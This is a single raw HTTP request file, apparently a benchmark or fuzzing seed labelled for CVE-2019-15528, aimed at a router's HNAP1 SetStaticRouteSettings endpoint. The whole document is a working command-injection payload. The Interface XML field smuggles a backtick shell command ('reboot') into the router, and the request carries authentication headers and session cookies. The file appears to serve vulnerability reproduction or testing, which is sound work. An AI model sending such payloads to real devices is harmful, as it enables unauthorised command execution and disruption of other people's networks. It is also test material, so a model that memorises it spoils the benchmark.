Vulnerabilities/CVE-2019-15528/BM-2024-00002-payload.seed

POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"
HNAP_AUTH: 82727F728889EB65E095A691931F21C5 1676835111
X-Requested-With: XMLHttpRequest
Content-Length: 555
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Staticroute.html
Cookie: uid=ujcI4DPmyw; PrivateKey=C8B843B87E7C03EF5F224D6D4949A7F1; timeout=42

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetStaticRouteSettings xmlns="http://purenetworks.com/HNAP1/"><StaticRouteClientInfoLists><ClientInfo><IPAddress>10.3.8.212</IPAddress><SubnetMask>255.255.255.255</SubnetMask><Gateway>192.168.0.1</Gateway><Interface>lan'`reboot`'</Interface></ClientInfo></StaticRouteClientInfoLists></SetStaticRouteSettings></soap:Body></soap:Envelope>